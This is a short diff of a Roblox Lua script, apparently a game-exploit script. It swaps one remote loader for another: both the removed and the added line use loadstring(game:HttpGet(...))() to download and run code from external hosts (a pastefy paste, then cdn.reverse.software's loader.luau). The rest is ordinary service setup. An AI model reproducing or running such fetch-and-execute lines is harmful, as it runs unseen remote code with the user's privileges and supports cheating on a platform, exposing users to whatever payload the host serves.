@@ -1,4 +1,5 @@
-loadstring(game:HttpGet("https://pastefy.app/34qV9RKX/raw"))()
+ID="2eb3a306-23e4-4db1-8d35-0ab2e7e30044";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
